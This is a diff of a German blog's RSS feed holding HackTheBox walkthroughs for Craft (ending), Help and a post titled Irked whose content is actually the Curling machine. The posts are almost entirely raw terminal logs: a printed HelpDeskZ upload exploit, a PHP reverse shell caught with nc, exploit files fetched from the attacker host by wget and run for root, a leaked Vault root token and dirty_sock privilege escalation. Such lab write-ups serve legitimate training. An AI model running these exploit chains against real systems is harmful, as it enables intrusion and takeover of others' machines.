+drwx&mdash;&mdash; 2 gilfoyle gilfoyle 4.0K Jan 6 12:45 .gnupg<br>
+drwxr-xr-x 2 gilfoyle gilfoyle 4.0K Jan 6 12:20 .nano<br>
+-rw-r&ndash;r&ndash; 1 gilfoyle gilfoyle 148 Feb 8 2019 .profile<br>
+drwx&mdash;&mdash; 2 gilfoyle gilfoyle 4.0K Feb 9 2019 .ssh<br>
+-rw&mdash;&mdash;- 1 gilfoyle gilfoyle 36 Jan 6 15:00 .vault-token<br>
+-rw&mdash;&mdash;- 1 gilfoyle gilfoyle 3.5K Jan 6 14:58 .viminfo<br>
+-r&mdash;&mdash;&ndash; 1 gilfoyle gilfoyle 33 Feb 9 2019 user.txt<br>
+gilfoyle@craft:~$ cat .vault-token<br>
+f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9</p>
+<p>gilfoyle@craft:~$ vault token capabilities f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9<br>
+root<br>
+gilfoyle@craft:~$ vault login<br>
+Token (will be hidden):<br>
+Success! You are now authenticated. The token information displayed below<br>
+is already stored in the token helper. You do NOT need to run &ldquo;vault login&rdquo;<br>
+again. Future Vault requests will automatically use this token.</p>
+<p>Key Value</p>
+<hr>
+<p>token f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9<br>
+token_accessor 1dd7b9a1-f0f1-f230-dc76-46970deb5103<br>
+token_duration ∞<br>
+token_renewable false<br>
+token_policies [&ldquo;root&rdquo;]<br>
+identity_policies []<br>
+policies [&ldquo;root&rdquo;]<br>
+gilfoyle@craft:~$ vault ssh -mode otp root@localhost<br>
+WARNING: No -role specified. Use -role to tell Vault which ssh role to use for<br>
+authentication. In the future, you will need to tell Vault which role to use.<br>
+For now, Vault will attempt to guess based on the API response. This will be<br>
+removed in the Vault 1.1.<br>
+Vault SSH: Role: &ldquo;root_otp&rdquo;<br>
+Vault could not locate &ldquo;sshpass&rdquo;. The OTP code for the session is displayed<br>
+below. Enter this code in the SSH password prompt. If you install sshpass,<br>
+Vault can automatically perform this step for you.<br>
+OTP for the session is: 3ed24235-8265-5927-dc3a-93b0d5ed2a8f</p>
+<p>. * .. . * *</p>
+<ul>
+<li>
+<ul>
+<li>@()Ooc()* o .<br>
+(Q@*0CG*O() ___<br>
+|_________/|/ _ \<br>
+| | | | | / | |<br>
+| | | | | | | |<br>
+| | | | | | | |<br>
+| | | | | | | |<br>
+| | | | | | | |<br>
+| | | | | _| |<br>
+| | | | |___/<br>
+|_|__|__|_/|<br>
+_________/</li>
+</ul>
+</li>
+</ul>
+<p>Password:<br>
+Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</p>
+<p>The programs included with the Debian GNU/Linux system are free software;<br>
+the exact distribution terms for each program are described in the<br>
+individual files in /usr/share/doc/*/copyright.</p>
+<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>
+permitted by applicable law.<br>
+Last login: Mon Jan 6 15:02:08 2020 from 127.0.0.1<br>
+root@craft:~# cat /root/root.txt<br>
+831#########ZENSIERT#########591<br>
+root@craft:~#</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>HackTheBox - Hawk</title>
+            <link>/posts/2010/01/hackthebox-hawk/</link>
+            <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
+            
+            <guid>/posts/2010/01/hackthebox-hawk/</guid>
             <description>root@kali:~# nmap -sV -sC 10.10.10.102
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-04 13:10 CET
 Nmap scan report for 10.10.10.102
@@ -4166,11 +4810,403 @@ Type &ldquo;help&rdquo;, &ldquo;copyright&rdquo;, &ldquo;credits&rdquo; or &ldqu
         </item>
         
         <item>
-            <title>HackTheBox - Jerry</title>
-            <link>https://www.m10x.de/posts/2010/01/hackthebox-jerry/</link>
+            <title>HackTheBox - Help</title>
+            <link>/posts/2010/01/hackthebox-help/</link>
             <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
             
-            <guid>https://www.m10x.de/posts/2010/01/hackthebox-jerry/</guid>
+            <guid>/posts/2010/01/hackthebox-help/</guid>
+            <description>root@kali:~# nmap -sV -sC 10.10.10.121
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-10 14:02 CEST
+Nmap scan report for 10.10.10.121
+Host is up (0.027s latency).
+Not shown: 997 closed ports
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+| 2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
+| 256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
+|_ 256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
+80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)</description>
+            <content type="html"><![CDATA[<p><a href="http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE"><img src="http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg" alt="Kurzes Video Walkthrough ohne Erklärungen"></a></p>
+<p>root@kali:~# nmap -sV -sC 10.10.10.121<br>
+Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-06-10 14:02 CEST<br>
+Nmap scan report for 10.10.10.121<br>
+Host is up (0.027s latency).<br>
+Not shown: 997 closed ports<br>
+PORT STATE SERVICE VERSION<br>
+22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)<br>
+| ssh-hostkey:<br>
+| 2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)<br>
+| 256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)<br>
+|_ 256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)<br>
+80/tcp open http Apache httpd 2.4.18 ((Ubuntu))<br>
+|_http-server-header: Apache/2.4.18 (Ubuntu)<br>
+|_http-title: Apache2 Ubuntu Default Page: It works<br>
+3000/tcp open http Node.js Express framework<br>
+|_http-title: Site doesn&rsquo;t have a title (application/json; charset=utf-8).<br>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>
+Nmap done: 1 IP address (1 host up) scanned in 14.88 seconds<br>
+root@kali:~# gobuster -w /usr/share/wordlists/dirb/common.txt -u 10.10.10.121 -t 50</p>
+<h1 id="gobuster-v201-oj-reeves-thecolonial">=====================================================<br>
+Gobuster v2.0.1 OJ Reeves (@TheColonial)</h1>
+<h1 id="-timeout--10s">[+] Mode : dir<br>
+[+] Url/Domain : http://10.10.10.121/<br>
+[+] Threads : 50<br>
+[+] Wordlist : /usr/share/wordlists/dirb/common.txt<br>
+[+] Status codes : 200,204,301,302,307,403<br>
+[+] Timeout : 10s</h1>
+<h1 id="20190610-140410-starting-gobuster">2019/06/10 14:04:10 Starting gobuster</h1>
+<h1 id="support-status-301">/.htpasswd (Status: 403)<br>
+/.htaccess (Status: 403)<br>
+/.hta (Status: 403)<br>
+/index.html (Status: 200)<br>
+/javascript (Status: 301)<br>
+/server-status (Status: 403)<br>
+/support (Status: 301)</h1>
+<h1 id="20190610-140416-finished">2019/06/10 14:04:16 Finished</h1>
+<p>root@kali:~# searchsploit helpdeskz</p>
+<hr>
+<p>Exploit Title | Path<br>
+| (/usr/share/exploitdb/)</p>
+<hr>
+<p>HelpDeskZ 1.0.2 - Arbitrary File Upload | exploits/php/webapps/40300.py<br>
+HelpDeskZ &lt; 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download | exploits/php/webapps/41200.py</p>
+<hr>
+<p>Shellcodes: No Result<br>
+root@kali:~# searchsploit -m exploits/php/webapps/40300.py<br>
+Exploit: HelpDeskZ 1.0.2 - Arbitrary File Upload<br>
+URL: <a href="https://www.exploit-db.com/exploits/40300">https://www.exploit-db.com/exploits/40300</a><br>
+Path: /usr/share/exploitdb/exploits/php/webapps/40300.py<br>
+File Type: troff or preprocessor input, ASCII text, with CRLF line terminators</p>
+<p>Copied to: /root/40300.py</p>
+<p>import hashlib<br>
+import time<br>
+import sys<br>
+import requests</p>
+<p>print &lsquo;Helpdeskz v1.0.2 - Unauthenticated shell upload exploit&rsquo;</p>
+<p>if len(sys.argv) &lt; 3:<br>
+print &ldquo;Usage: {} [baseUrl] [nameOfUploadedFile]&quot;.format(sys.argv[0])<br>
+sys.exit(1)</p>
+<p>helpdeskzBaseUrl = sys.argv[1]<br>
+fileName = sys.argv[2]</p>
+<p>currentTime = int(time.time())</p>
+<p>for x in range(0, 600):<br>
+plaintext = fileName + str(currentTime - x)<br>
+md5hash = hashlib.md5(plaintext).hexdigest()</p>
+<p>url = helpdeskzBaseUrl+'/uploads/tickets/'+md5hash+'.php'<br>
+response = requests.head(url)<br>
+if response.status_code == 200:<br>
+print &ldquo;found!&rdquo;<br>
+print url<br>
+sys.exit(0)</p>
+<p>print &ldquo;Sorry, I did not find anything&rdquo;</p>
+<p>root@kali:~# python 40300.py http://10.10.10.121/support/ php-reverse-shell.php<br>
+Helpdeskz v1.0.2 - Unauthenticated shell upload exploit<br>
+found!<br>
+http://10.10.10.121/support/uploads/tickets/551a9079298f06e43893d9d6392bc80e.php</p>
+<p>root@kali:~# cd Downloads/<br>
+root@kali:~/Downloads# ls<br>
+44298.c encrypt-pdf.py index.html irked.jpg pass.txt token token.pdf.enc<br>
+root@kali:~/Downloads# python -m SimpleHTTPServer 80<br>
+Serving HTTP on 0.0.0.0 port 80 &hellip;<br>
+10.10.10.121 - - [10/Jun/2019 14:32:06] &ldquo;GET /44298.c HTTP/1.1&rdquo; 200 -</p>
+<p>root@kali:~# nc -lnvp 1234<br>
+listening on [any] 1234 &hellip;<br>
+connect to [10.10.14.27] from (UNKNOWN) [10.10.10.121] 57700<br>
+Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux<br>
+05:22:33 up 2:15, 0 users, load average: 0.00, 0.00, 0.00<br>
+USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT<br>
+uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)<br>
+/bin/sh: 0: can&rsquo;t access tty; job control turned off<br>
+$ cd /home<br>
+$ ls<br>
+help<br>
+$ cd help<br>
+$ ls -alh<br>
+total 76K<br>
+drwxr-xr-x 7 help help 4.0K Jan 11 06:07 .<br>
+drwxr-xr-x 3 root root 4.0K Nov 27 2018 ..<br>
+-rw-rw-r&ndash; 1 help help 272 Jan 11 06:17 .bash_history<br>
+-rw-r&ndash;r&ndash; 1 help help 220 Nov 27 2018 .bash_logout<br>
+-rw-r&ndash;r&ndash; 1 root root 1 Nov 27 2018 .bash_profile<br>
+-rw-r&ndash;r&ndash; 1 help help 3.7K Nov 27 2018 .bashrc<br>
+drwx&mdash;&mdash; 2 help help 4.0K Nov 27 2018 .cache<br>
+drwxr-xr-x 4 help help 4.0K Jun 10 03:07 .forever<br>
+-rw&mdash;&mdash;- 1 help help 442 Nov 28 2018 .mysql_history<br>
+drwxrwxr-x 2 help help 4.0K Nov 27 2018 .nano<br>
+drwxrwxr-x 290 help help 12K Jan 11 05:53 .npm<br>
+-rw-r&ndash;r&ndash; 1 help help 655 Nov 27 2018 .profile<br>
+-rw-rw-r&ndash; 1 help help 66 Nov 28 2018 .selected_editor<br>
+-rw-r&ndash;r&ndash; 1 help help 0 Nov 27 2018 .sudo_as_admin_successful<br>
+-rw-rw-r&ndash; 1 help help 225 Dec 11 01:53 .wget-hsts<br>
+drwxrwxrwx 6 root root 4.0K Jan 11 05:53 help<br>
+-rw-rw-r&ndash; 1 help help 946 Nov 28 2018 npm-debug.log<br>
+-rw-r&ndash;r&ndash; 1 root root 33 Nov 28 2018 user.txt<br>
+$ cat user.txt<br>
+bb8#########ZENSIERT#########6af<br>
+$ uname -a<br>
+Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux<br>
+$ cd /tmp<br>
+$ wget http://10.10.14.27/44298.c<br>
+&ndash;2019-06-10 05:32:37&ndash; http://10.10.14.27/44298.c<br>
+Connecting to 10.10.14.27:80&hellip; connected.<br>
+HTTP request sent, awaiting response&hellip; 200 OK<br>
+Length: 6021 (5.9K) [text/plain]<br>
+Saving to: &lsquo;44298.c&rsquo;</p>
+<p>0K &hellip;.. 100% 535M=0s</p>
+<p>2019-06-10 05:32:37 (535 MB/s) - &lsquo;44298.c&rsquo; saved [6021/6021]</p>
+<p>$ gcc -o exploit 44298.c<br>
+$ ./exploit<br>
+whoami<br>
+root<br>
+cat /root/root.txt<br>
+b7f#########ZENSIERT#########b98</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>HackTheBox - Irked</title>
+            <link>/posts/2010/01/hackthebox-irked/</link>
+            <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
+            
+            <guid>/posts/2010/01/hackthebox-irked/</guid>
+            <description>root@kali:~# nmap -sV -sC 10.10.10.150
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-31 14:47 CEST
+Nmap scan report for 10.10.10.150
+Host is up (0.026s latency).
+Not shown: 998 closed ports
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+| 2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
+| 256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
+|_ 256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
+80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: Joomla! - Open Source Content Management</description>
+            <content type="html"><![CDATA[<p><a href="http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE"><img src="http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg" alt="Kurzes Video Walkthrough ohne Erklärungen"></a></p>
+<p>root@kali:~# nmap -sV -sC 10.10.10.150<br>
+Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-03-31 14:47 CEST<br>
+Nmap scan report for 10.10.10.150<br>
+Host is up (0.026s latency).<br>
+Not shown: 998 closed ports<br>
+PORT STATE SERVICE VERSION<br>
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)<br>
+| ssh-hostkey:<br>
+| 2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)<br>
+| 256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)<br>
+|_ 256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)<br>
+80/tcp open http Apache httpd 2.4.29 ((Ubuntu))<br>
+|_http-generator: Joomla! - Open Source Content Management<br>
+|_http-server-header: Apache/2.4.29 (Ubuntu)<br>
+|_http-title: Home<br>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>
+Nmap done: 1 IP address (1 host up) scanned in 13.17 seconds</p>
+<p>root@kali:~# gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.150:80 -t 50</p>
+<h1 id="gobuster-v201-oj-reeves-thecolonial">=====================================================<br>
+Gobuster v2.0.1 OJ Reeves (@TheColonial)</h1>
+<h1 id="-timeout--10s">[+] Mode : dir<br>
+[+] Url/Domain : http://10.10.10.150:80/<br>
+[+] Threads : 50<br>
+[+] Wordlist : /usr/share/wordlists/dirb/common.txt<br>
+[+] Status codes : 200,204,301,302,307,403<br>
+[+] Timeout : 10s</h1>
+<h1 id="20190331-144820-starting-gobuster">2019/03/31 14:48:20 Starting gobuster</h1>
+<h1 id="tmp-status-301">/.hta (Status: 403)<br>
+/.htaccess (Status: 403)<br>
+/.htpasswd (Status: 403)<br>
+/administrator (Status: 301)<br>
+/bin (Status: 301)<br>
+/cache (Status: 301)<br>
+/components (Status: 301)<br>
+/images (Status: 301)<br>
+/includes (Status: 301)<br>
+/index.php (Status: 200)<br>
+/language (Status: 301)<br>
+/layouts (Status: 301)<br>
+/libraries (Status: 301)<br>
+/media (Status: 301)<br>
+/modules (Status: 301)<br>
+/plugins (Status: 301)<br>
+/server-status (Status: 403)<br>
+/templates (Status: 301)<br>
+/tmp (Status: 301)</h1>
+<h1 id="20190331-144826-finished">2019/03/31 14:48:26 Finished</h1>
+<p>root@kali:~# echo &ldquo;Q3VybGluZzIwMTgh&rdquo; | base64 -d<br>
+Curling2018!root@kali:~# ifconfig tun0<br>
+tun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt; mtu 1500<br>
+inet 10.10.13.2 netmask 255.255.252.0 destination 10.10.13.2<br>
+inet6 dead:beef:2::1100 prefixlen 64 scopeid 0x0<!-- raw HTML omitted --><br>
+inet6 fe80::585f:b579:1f65:38e7 prefixlen 64 scopeid 0x20<!-- raw HTML omitted --><br>
+unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 txqueuelen 100 (UNSPEC)<br>
+RX packets 28411 bytes 7832677 (7.4 MiB)<br>
+RX errors 0 dropped 0 overruns 0 frame 0<br>
+TX packets 35723 bytes 3524631 (3.3 MiB)<br>
+TX errors 0 dropped 297 overruns 0 carrier 0 collisions 0</p>
+<p>root@kali:~# clear<br>
+root@kali:~# nc -lnvp 1234<br>
+listening on [any] 1234 &hellip;<br>
+connect to [10.10.13.2] from (UNKNOWN) [10.10.10.150] 44812<br>
+/bin/sh: 0: can&rsquo;t access tty; job control turned off<br>
+$ python -c &lsquo;import pty; pty.spawn(&quot;/bin/bash&quot;)&rsquo;<br>
+/bin/sh: 1: python: not found<br>
+$ python3 -c &lsquo;import pty; pty.spawn(&quot;/bin/bash&quot;)&rsquo;</p>
+<p>www-data@curling:/var/www/html/templates/protostar$ ^Z<br>
+[1]+ Stopped nc -lnvp 1234<br>
+root@kali:~# stty raw -echo<br>
+root@kali:~# nc -lnvp 1234</p>
+<p>&lt;tml/templates/protostar$ export TERM=xterm256-color<br>
+www-data@curling:/var/www/html/templates/protostar$ cd /home<br>
+www-data@curling:/home$ ls<br>
+dirty_sock floris<br>
+www-data@curling:/home$ cd floris<br>
+www-data@curling:/home/floris$ ls -alh<br>
+total 116K<br>
+drwxr-xr-x 6 floris floris 4.0K Mar 31 13:16 .<br>
+drwxr-xr-x 4 root root 4.0K Mar 31 13:12 ..<br>
+lrwxrwxrwx 1 root root 9 May 22 2018 .bash_history -&gt; /dev/null<br>
+-rw-r&ndash;r&ndash; 1 floris floris 220 Apr 4 2018 .bash_logout<br>
+-rw-r&ndash;r&ndash; 1 floris floris 3.7K Apr 4 2018 .bashrc<br>
+drwx&mdash;&mdash; 2 floris floris 4.0K May 22 2018 .cache<br>
+drwx&mdash;&mdash; 3 floris floris 4.0K May 22 2018 .gnupg<br>
+drwxrwxr-x 3 floris floris 4.0K May 22 2018 .local<br>
+-rw-r&ndash;r&ndash; 1 floris floris 807 Apr 4 2018 .profile<br>
+-rw&mdash;&mdash;- 1 floris floris 1.2K Mar 31 13:12 .viminfo<br>
+-rw-rw-r&ndash; 1 floris floris 52 Mar 31 13:12 README.txt<br>
+-rw-rw-r&ndash; 1 floris floris 52 Mar 31 13:16 README1.txt<br>
+-rw-rw-r&ndash; 1 floris floris 52 Mar 31 13:16 README10.txt<br>
+-rw-rw-r&ndash; 1 floris floris 52 Mar 31 13:16 README11.txt<br>
+-rw-rw-r&ndash; 1 floris floris 52 Mar 31 13:16 README2.txt<br>
+-rw-rw-r&ndash; 1 floris floris 52 Mar 31 13:16 README3.txt<br>
+-rw-rw-r&ndash; 1 floris floris 52 Mar 31 13:16 README4.txt<br>
+-rw-rw-r&ndash; 1 floris floris 52 Mar 31 13:16 README5.txt<br>
+-rw-rw-r&ndash; 1 floris floris 52 Mar 31 13:16 README6.txt<br>
+-rw-rw-r&ndash; 1 floris floris 52 Mar 31 13:16 README7.txt<br>
+-rw-rw-r&ndash; 1 floris floris 52 Mar 31 13:16 README8.txt<br>
+-rw-rw-r&ndash; 1 floris floris 52 Mar 31 13:16 README9.txt<br>
+drwxr-x&mdash; 2 root floris 4.0K May 22 2018 admin-area<br>
+-rw-rw-r&ndash; 1 floris floris 5.4K Mar 31 13:09 dirty_sockv1.py<br>
+-rwxrwxr-x 1 floris floris 8.5K Mar 31 13:09 dirty_sockv2.py<br>
+-rw-r&ndash;r&ndash; 1 floris floris 1.1K May 22 2018 password_backup<br>
+-rw-r&mdash;&ndash; 1 floris floris 33 May 22 2018 user.txt</p>
+<p>www-data@curling:/home/floris$ cat password_backup<br>
+00000000: 425a 6839 3141 5926 5359 819b bb48 0000 BZh91AY&amp;SY&hellip;H..<br>
+00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34 &hellip;.A&hellip;P)ava.:4<br>
+00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960 N&hellip;n.T.#.@%&hellip;<code>00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000 ......z.@......   00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800 ..i.4hdi...9.h..   00000050: 000f 51a0 0064 681a 069e a190 0000 0034 ..Q..dh........4   00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0 i...5.n......J..   00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78 .h...*..}y..&lt;~.x   00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931 .&gt;...sVT.zH....1   00000090: c856 921b 1221 3385 6046 a2dd c173 0d22 .V...!3.</code>F&hellip;s.&quot;<br>
+000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290 ..n&hellip;.7j:X.d.R.<br>
+000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503 .k./&hellip; &hellip;.)p..<br>
+000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843 7..;&hellip;..9&hellip;P.C<br>
+000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c .Y.P&hellip;HB&hellip;.*..<br>
+000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090 .G.. .U@r..rE8P.<br>
+000000f0: 819b bb48 &hellip;H<br>
+www-data@curling:/home/floris$ xxd -r &lt; password_backup &gt; password_backup2<br>
+bash: password_backup2: Permission denied<br>
+www-data@curling:/home/floris$ xxd -r &lt; password_backup | file -<br>
+/dev/stdin: bzip2 compressed data, block size = 900k<br>
+www-data@curling:/home/floris$ xxd -r &lt; password_backup | bzcat | file -<br>
+/dev/stdin: gzip compressed data, was &ldquo;password&rdquo;, last modified: Tue May 22 19:16:20 2018, from Unix<br>
+&lt;is$ xxd -r &lt; password_backup | bzcat | gunzip -c | file -<br>
+/dev/stdin: bzip2 compressed data, block size = 900k<br>
+&lt;d -r &lt; password_backup | bzcat | gunzip -c | bzcat | file -<br>
+/dev/stdin: POSIX tar archive (GNU)<br>
+&lt;assword_backup | bzcat | gunzip -c | bzcat | tar x0 | file -<br>
+tar: Options &lsquo;-[0-7][lmh]&rsquo; not supported by <em>this</em> tar<br>
+Try &lsquo;tar &ndash;help&rsquo; or &lsquo;tar &ndash;usage&rsquo; for more information.<br>
+/dev/stdin: empty<br>
+&lt;ackup | bzcat | gunzip -c | bzcat | tar xO | file -<br>
+/dev/stdin: ASCII text<br>
+&lt;ackup | bzcat | gunzip -c | bzcat | tar xO<br>
+5d&lt;wdCbdZu)|hChXll</p>
+<p>root@kali:~# ssh <a href="mailto:floris@10.10.10.150">floris@10.10.10.150</a> [456/456]<br>
+<a href="mailto:floris@10.10.10.150">floris@10.10.10.150</a>&rsquo;s password:<br>
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-22-generic x86_64)</p>
+<ul>
+<li>Documentation: <a href="https://help.ubuntu.com">https://help.ubuntu.com</a></li>
+<li>Management: <a href="https://landscape.canonical.com">https://landscape.canonical.com</a></li>
+<li>Support: <a href="https://ubuntu.com/advantage">https://ubuntu.com/advantage</a></li>
+</ul>
+<p>System information as of Sun Mar 31 13:24:19 UTC 2019</p>
+<p>System load: 0.0 Processes: 203<br>
+Usage of /: 46.3% of 9.78GB Users logged in: 1<br>
+Memory usage: 24% IP address for ens33: 10.10.10.150<br>
+Swap usage: 0%</p>
+<p>0 packages can be updated.<br>
+0 updates are security updates.</p>
+<p>Failed to connect to <a href="https://changelogs.ubuntu.com/meta-release-lts">https://changelogs.ubuntu.com/meta-release-lts</a>. Check your Internet connection or proxy settings</p>
+<p>Last login: Sun Mar 31 13:11:06 2019 from 10.10.15.247<br>
+floris@curling:~$ cat user.txt<br>
+65d#########ZENSIERT#########30b</p>
+<p>floris@curling:~/admin-area$ ls -alh<br>
+total 28K<br>
+drwxr-x&mdash; 2 root floris 4.0K May 22 2018 .<br>
+drwxr-xr-x 6 floris floris 4.0K Mar 31 13:16 ..<br>
+-rw-rw&mdash;- 1 root floris 25 Mar 31 13:29 input<br>
+-rw-rw&mdash;- 1 root floris 14K Mar 31 13:29 report<br>
+floris@curling:~/admin-area$ cat input<br>
+url = &ldquo;http://127.0.0.1&rdquo;<br>
+floris@curling:~/admin-area$ cat report</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>floris@curling:~/admin-area$ vim input</p>
+<p>url = &ldquo;file:///root/root.txt&rdquo;</p>
+<p>floris@curling:~/admin-area$ ls -alh<br>
+total 16K<br>
+drwxr-x&mdash; 2 root floris 4.0K May 22 2018 .<br>
+drwxr-xr-x 6 floris floris 4.0K Mar 31 13:30 ..<br>
+-rw-rw&mdash;- 1 root floris 25 Mar 31 13:31 input<br>
+-rw-rw&mdash;- 1 root floris 33 Mar 31 13:31 report<br>
+floris@curling:~/admin-area$ cat report<br>
+82c198ab6fc5365fdc6da2ee5c26064a</p>
+<p>floris@curling:~$ cd /tmp<br>
+floris@curling:/tmp$ wget http://10.10.14.105:8000/dirty_sockv2.py<br>
+&ndash;2019-04-01 08:34:22&ndash; http://10.10.14.105:8000/dirty_sockv2.py<br>
+Connecting to 10.10.14.105:8000&hellip; connected.<br>
+HTTP request sent, awaiting response&hellip; 200 OK<br>
+Length: 8696 (8.5K) [text/plain]<br>
+Saving to: &lsquo;dirty_sockv2.py&rsquo;</p>
+<p>dirty_sockv2.py 100%[=====================================================================================================================&gt;] 8.49K &ndash;.-KB/s in 0s</p>
+<p>2019-04-01 08:34:22 (46.3 MB/s) - &lsquo;dirty_sockv2.py&rsquo; saved [8696/8696]</p>
+<p>floris@curling:/tmp$ python3 dirty_sockv2.py</p>
+<hr>
+<p>| \ | |<strong>/ | _/ [</strong> | | | |_/<br>
+|<strong>/ | | \ | | ___ <em><strong>] |</strong>| |</em></strong> | _<br>
+(version 2)</p>
+<p>//=========[]==========================================\<br>
+|| R&amp;D || initstring (@init_string) ||<br>
+|| Source || <a href="https://github.com/initstring/dirty_sock">https://github.com/initstring/dirty_sock</a> ||<br>
+|| Details || <a href="https://initblog.com/2019/dirty-sock">https://initblog.com/2019/dirty-sock</a> ||<br>
+\=========[]==========================================//</p>
+<p>[+] Slipped dirty sock on random socket file: /tmp/wvjupqdeyv;uid=0;<br>
+[+] Binding to socket file&hellip;<br>
+[+] Connecting to snapd API&hellip;<br>
+[+] Deleting trojan snap (and sleeping 5 seconds)&hellip;<br>
+[+] Installing the trojan snap (and sleeping 8 seconds)&hellip;<br>
+[+] Deleting trojan snap (and sleeping 5 seconds)&hellip;</p>
+<hr>
+<p>Success! You can now <code>su</code> to the following account and use sudo:<br>
+username: dirty_sock<br>
+password: dirty_sock</p>
+<hr>
+<p>floris@curling:/tmp$ su dirty_sock<br>
+Password:<br>
+To run a command as administrator (user &ldquo;root&rdquo;), use &ldquo;sudo <!-- raw HTML omitted -->&rdquo;.<br>
+See &ldquo;man sudo_root&rdquo; for details.</p>
+<p>dirty_sock@curling:/tmp$ sudo su<br>
+[sudo] password for dirty_sock:<br>
+root@curling:/tmp# cat /root/root.txt<br>
+82c#########ZENSIERT#########64a<br>
+root@curling:/tmp#</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>HackTheBox - Jerry</title>
+            <link>/posts/2010/01/hackthebox-jerry/</link>
+            <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
+            
+            <guid>/posts/2010/01/hackthebox-jerry/</guid>
             <description>Jerry wie ein kleiner Teil von Kotarak!
 root@kali:~# nmap 10.10.10.95 -sV -sC
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-19 14:02 CET
@@ -4322,10 +5358,10 @@ user.txt<br>
         
         <item>
             <title>HackTheBox - Nibbles</title>
-            <link>https://www.m10x.de/posts/2010/01/hackthebox-nibbles/</link>
+            <link>/posts/2010/01/hackthebox-nibbles/</link>
             <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
             
-            <guid>https://www.m10x.de/posts/2010/01/hackthebox-nibbles/</guid>
+            <guid>/posts/2010/01/hackthebox-nibbles/</guid>
